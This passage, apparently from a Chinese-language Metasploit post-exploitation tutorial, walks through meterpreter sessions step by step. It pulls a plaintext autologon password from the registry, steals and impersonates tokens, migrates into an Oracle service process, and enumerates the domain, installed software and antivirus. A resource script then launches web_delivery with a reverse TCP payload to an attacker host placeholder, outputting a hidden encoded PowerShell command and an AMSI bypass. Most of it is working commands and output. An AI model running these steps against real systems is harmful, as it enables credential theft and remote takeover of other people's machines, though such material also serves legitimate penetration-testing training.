| golden_ticket_create  | 创建一个黄金 kerberos 票证                                        |
| password_change       | 更改用户的密码/哈希                                               |
| kiwi_cmd              | 后面接 mimikatz 中的命令（如：kiwi_cmd sekurlsa::logonpasswords） |
| ......                | ......                                                            |

#### Windows Autologon

很多用户习惯将计算机设置自动登录，可以使用 msf 抓取自动登录的用户名和密码。

```console
meterpreter > run post/windows/gather/credentials/windows_autologin

[*] Running against WIN2019 on session 1
[+] AutoAdminLogon=1, DefaultDomain=xiaorang.lab, DefaultUser=yuxuan, DefaultPassword=Yuxuan7QbrgZ3L
meterpreter >
```

> 该模块提取注册表中的纯文本 Windows 用户登录密码。 它利用 Windows 的一个特性，Windows (2000 - 2008 R2) 允许用户或第三方 Windows 实用工具通过纯文本密码插入在注册表位置 `HKLM\Software\Microsoft\Windows NT\WinLogon` 的 (Alt)DefaultPassword 字段中配置用户自动登录。该注册表字段所有用户都可读。

### 令牌窃取 & 进程迁移

使用 incognito 模块窃取 token：

```console
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > use incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
DESKTOP-TEST\test
NT AUTHORITY\SYSTEM

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token "DESKTOP-TEST\test"
[+] Delegation token available
[+] Successfully impersonated user DESKTOP-TEST\test
meterpreter > getuid
Server username: DESKTOP-TEST\test

meterpreter > rev2self
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

> 注：在实际使用过程中，经常遇见 incognito 列出的 token 不全面的情况。

窃取指定进程的 token：

```console
meterpreter > ps | grep oracle
Filtering on 'oracle'

Process List
============

 PID   PPID  Name        Arch  Session  User                          Path
 ---   ----  ----        ----  -------  ----                          ----
 3176  652   oracle.exe  x64   0        NT SERVICE\OracleServiceORCL  C:\WINDOWS.X64_193000_db_home\bin\oracle.exe

meterpreter > steal_token 3176
Stolen token with username: NT SERVICE\OracleServiceORCL
meterpreter >
```

进程迁移：

```console
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > getpid
Current pid: 6668
meterpreter > ps | grep oracle
Filtering on 'oracle'

Process List
============

 PID   PPID  Name        Arch  Session  User                          Path
 ---   ----  ----        ----  -------  ----                          ----
 3176  652   oracle.exe  x64   0        NT SERVICE\OracleServiceORCL  C:\WINDOWS.X64_193000_db_home\bin\oracle.exe

meterpreter > migrate 3176
[*] Migrating from 6668 to 3176...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT SERVICE\OracleServiceORCL
meterpreter > getpid
Current pid: 3176
meterpreter >
```

> 注：进程迁移操作一定要谨慎。一方面是进程迁移后会有被杀软查杀的风险；另一方面是当迁移到低权限进程后，无法再迁移回来。在迁移进程前一定要做好权限维持、派生好新会话。

### 枚举信息

域环境枚举：

```console
meterpreter > run post/windows/gather/enum_domain

[+] Domain FQDN: redteam.red
[+] Domain NetBIOS Name: REDTEAM
[+] Domain Controller: owa.redteam.red (IP: 10.10.10.8)
```

是否是虚拟机：

```console
meterpreter > run post/windows/gather/checkvm

[*] Checking if the target is a Virtual Machine ...
[+] This is a Hyper-V Virtual Machine
meterpreter >
```

获取安装软件信息：

```console
meterpreter > run post/windows/gather/enum_applications

[*] Enumerating applications installed on DESKTOP-TEST

Installed Applications
======================

 Name                                                                Version
 ----                                                                -------
 7-Zip 22.01 (x64)                                                   22.01
 Java 8 Update 202 (64-bit)                                          8.0.2020.8
 Java Auto Updater                                                   2.8.202.8
 Java SE Development Kit 8 Update 202 (64-bit)                       8.0.2020.8
 Microsoft Edge                                                      113.0.1774.42
 Microsoft Edge Update                                               1.3.175.27
 Microsoft Edge WebView2 Runtime                                     113.0.1774.42
 Microsoft OneDrive                                                  23.086.0423.0001
 Microsoft Update Health Tools                                       3.72.0.0
 Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29913  14.28.29913.0
 Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.28.29913  14.28.29913.0
 Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29913      14.28.29913
 Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29913         14.28.29913
 Microsoft Visual C++ 2019 X86 Additional Runtime - 14.28.29913      14.28.29913
 Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.28.29913         14.28.29913
 VMware Tools                                                        11.3.5.18557794
 cosbrowser 2.10.1                                                   2.10.1


[+] Results stored in: /home/kali/.msf4/loot/20230516031837_default_192.168.70.129_host.application_629050.txt
meterpreter >
```

获取杀软信息：

```console
meterpreter > run post/windows/gather/enum_av_excluded

[*] Enumerating Excluded Paths for AV on DESKTOP-TEST
[+] Found Windows Defender
[*] No extension exclusions for Windows Defender
[*] No path exclusions for Windows Defender
[*] No process exclusions for Windows Defender
meterpreter > run post/windows/gather/enum_av

[*] Found AV product:
displayName=Windows Defender
instanceGuid={D68DDC3A-831F-4fae-9E44-DA132C1ACF46}
pathToSignedProductExe=windowsdefender://
pathToSignedReportingExe=%ProgramFiles%\Windows Defender\MsMpeng.exe
productState=397568
timestamp=Tue, 16 May 2023 06:11:19 GMT

meterpreter >
```

### 搜索文件

```console
meterpreter > search -f *test.txt
Found 2 results...
==================

Path                                         Size (bytes)  Modified (UTC)
----                                         ------------  --------------
c:\Users\test\Desktop\test.txt               13            2023-05-16 02:38:38 -0400
c:\test.txt                                  13            2023-05-16 02:38:06 -0400

meterpreter > search -d "c:\\Users\\test\\Desktop\\" -f *test.txt
Found 1 results...
==================

Path                                         Size (bytes)  Modified (UTC)
----                                         ------------  --------------
C:\Users\test\Desktop\test.txt               13            2023-05-16 02:38:38 -0400

meterpreter > search -d "c:\\Users\\test\\Desktop\\" -f test.txt
Found 2 results...
==================

Path                                                                                     Size (bytes)  Modified (UTC)
----                                                                                     ------------  --------------
C:\Users\test\Desktop\test.txt                                                           13            2023-05-16 02:38:38 -0400
C:\Users\test\Desktop\新建文本文档.txt                                                   24            2023-05-16 02:47:16 -0400

meterpreter >
```

> 注：使用 -d 参数指定目录，且 -f 参数中没有使用通配符，这将会扫描文件内容，对内容进行匹配。

## Resource Scripts

Resource Scripts 为在 Metasploit 中自动执行重复任务提供了一种简单的方法。

resource 命令将执行位于文本文件内的 Meterpreter 指令。每行包含一个条目，resource 将按顺序执行每一行。这可以帮助自动执行用户执行的重复操作。

脚本文件内容：

```console
root@kali:~# cat web_delivery.txt
use exploit/multi/script/web_delivery
set target 2
set payload windows/x64/meterpreter/reverse_tcp
set srvhost <atk_ip>
set lhost <lhost>
set lport 4444
run

```

使用 resource 命令运行脚本：

```console
msf6 > resource web_delivery.txt
[*] Processing /home/kali/Desktop/web_delivery.txt for ERB directives.
resource (/home/kali/Desktop/web_delivery.txt)> use exploit/multi/script/web_delivery
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
resource (/home/kali/Desktop/web_delivery.txt)> set target 2
target => 2
resource (/home/kali/Desktop/web_delivery.txt)> set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
resource (/home/kali/Desktop/web_delivery.txt)> set srvhost <atk_ip>
srvhost => <atk_ip>
resource (/home/kali/Desktop/web_delivery.txt)> set lhost <lhost>
lhost => <lhost>
resource (/home/kali/Desktop/web_delivery.txt)> set lport 4444
lport => 4444
resource (/home/kali/Desktop/web_delivery.txt)> run
[*] Exploit running as background job 12.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on <lhost>:4444
[*] Using URL: http://<atk_ip>:8080/1Ep9ma
[*] Server started.
[*] Run the following command on the target machine:
msf6 exploit(multi/script/web_delivery) > powershell.exe -nop -w hidden -e WwBOAGUAdAA...hACcAQApADsA

msf6 exploit(multi/script/web_delivery) >

[*] 192.168.70.128   web_delivery - Delivering AMSI Bypass (1391 bytes)
[*] 192.168.70.128   web_delivery - Delivering Payload (3693 bytes)
[*] Sending stage (200774 bytes) to xx.xx.xx.xx
[*] Meterpreter session 1 opened (<lhost>:4444 -> xx.xx.xx.xx:49772) at 2023-03-13 08:42:18 -0400

```

也可以在启动 MSF 时，就使用 `-r` 参数设置在启动后运行指定文件中的命令 `msfconsole -r /root/ListenerScript.rc`。

## References

> [https://docs.metasploit.com/](https://docs.metasploit.com/)
>
> [https://www.offsec.com/metasploit-unleashed/](https://www.offsec.com/metasploit-unleashed/)
>
> [https://www.infosecmatter.com/metasploit-module-library/](https://www.infosecmatter.com/metasploit-module-library/)
>
> [https://cheatsheet.haax.fr/](https://cheatsheet.haax.fr/)
>
> [https://www.cobaltstrike.com/blog/interoperability-with-the-metasploit-framework](https://www.cobaltstrike.com/blog/interoperability-with-the-metasploit-framework)
